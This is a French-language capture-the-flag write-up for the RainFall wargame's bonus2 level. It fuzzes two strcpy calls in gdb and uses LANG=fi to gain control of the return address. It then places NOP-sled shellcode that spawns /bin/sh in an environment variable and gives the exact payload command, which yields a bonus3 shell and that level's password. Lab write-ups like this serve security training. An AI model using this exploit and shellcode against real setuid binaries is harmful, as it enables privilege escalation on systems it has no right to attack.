# Bonus 2

En lanceant le programme on doit mettre deux arguments sinon celui-ci exit. lorsque nous lancont avec 2 string on peut peut voir qu'il concate le premier parametre avec 'Hello'
```
bonus2@RainFall:~$ ./bonus2 
bonus2@RainFall:~$ ./bonus2 test
bonus2@RainFall:~$ ./bonus2 test test1
Hello test
bonus2@RainFall:~$ ./bonus2 test test1 test2
bonus2@RainFall:~$
```
En regardant dans cuter on voit qu'il y a 2 `strcpy` qu'on doit pouvoir overflow, donc maintenant on vas essayer de trouver un `segfault` avec buffer overflow generator.
```
(gdb) r $(cat /tmp/BOgenerator) test
Starting program: /home/user/bonus2/bonus2 $(cat /tmp/BOgenerator) test
Hello Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Atest
[Inferior 1 (process 11401) exited with code 063]
(gdb) r test $(cat /tmp/BOgenerator) 
Starting program: /home/user/bonus2/bonus2 test $(cat /tmp/BOgenerator)
Hello test
[Inferior 1 (process 11404) exited with code 013]
(gdb) r $(cat /tmp/BOgenerator) $(cat /tmp/BOgenerator) 
Starting program: /home/user/bonus2/bonus2 $(cat /tmp/BOgenerator) $(cat /tmp/BOgenerator)
Hello Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2AAa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab

Program received signal SIGSEGV, Segmentation fault.
0x08006241 in ?? ()
```
on ne peut pas exploiter cette adresse, mais on remarque que la vérification de la variable env LANG est stockée dans une variable globale `language` qui est comparer a plusieur valeur pour l'affichage du hello dans les differante langue.

```
bonus2@RainFall:~$ env
[...]
LANG=en_US.UTF-8
[...]
```
On voit que la langue est en Americain nous allons essayer de la passer en `fi`
```
bonus2@RainFall:~$ LANG=fi
bonus2@RainFall:~$ gdb ./bonus2 
gdb) run $(cat /tmp/BOgenerator) $(cat /tmp/BOgenerator)                
Starting program: /home/user/bonus2/bonus2 $(cat /tmp/BOgenerator) $(cat /tmp/BOgenerator)
Hyvää päivää Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2AAa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab

Program received signal SIGSEGV, Segmentation fault.
0x41366141 in ?? ()
```
Cette fois ci nous avons une adresse exploitable, lorsque nous la mettons dans buffer overflow generator : https://wiremask.eu/tools/buffer-overflow-pattern-generator/ on optien un offset de 18. On voit dans le programme que le premier argument va être mov dans un buffer de 40 octers. Maintenant il ne nous reste plus qu'a cree un payload qui vas generer un buffer overflow qui y  ira ensuite chercher dans le nopesled le shellcode
```
(gdb) b main 
Breakpoint 1 at 0x804852f
(gdb) run         
The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /home/user/bonus2/bonus2 $(cat /tmp/BOgenerator) $(cat /tmp/BOgenerator)

Breakpoint 1, 0x0804852f in main ()
(gdb) x/200s environ
[...]
0xbffffc9b:      "payload=\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\"...
0xbffffd63:      "\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\"...
0xbffffe2b:      "\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220j\vX\231Rh//shh/bin\211\343\061\311\315\200"
0xbffffead:      "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games"
[...]
```
On as donc recuperer notre addresse du nopesled `0xbffffd63` nous allons donc cree un payload qui vas overflow le premier argument en affichant 40 caractere et le segond avec 18 + l'adresse du nopesled
```
bonus2@RainFall:~$ ./bonus2 $(python -c 'print 40*"A"') $(python -c 'print 18*"B" + "\x63\xfd\xff\xbf"')
Hyvää päivää AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBc���
$ whoami
bonus3
$ cat /home/user/bonus3/.pass
71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
$   
```
